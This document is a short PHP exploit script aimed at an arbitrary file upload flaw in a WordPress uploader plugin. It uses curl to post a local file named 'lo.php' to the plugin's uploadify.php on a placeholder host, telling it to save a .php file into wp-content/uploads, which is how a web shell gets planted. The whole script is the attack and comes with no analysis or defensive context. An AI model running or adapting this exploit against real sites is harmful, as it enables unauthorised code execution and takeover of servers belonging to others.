<?php

$uploadfile="lo.php";
$ch = curl_init("http://www.example.com/wordpress/wp-content/plugins/uploader/uploadify/uploadify.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('Filedata'=>"@$uploadfile",
'folder'=>"/wordpress/wp-content/uploads",
'fileext'=>'php'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>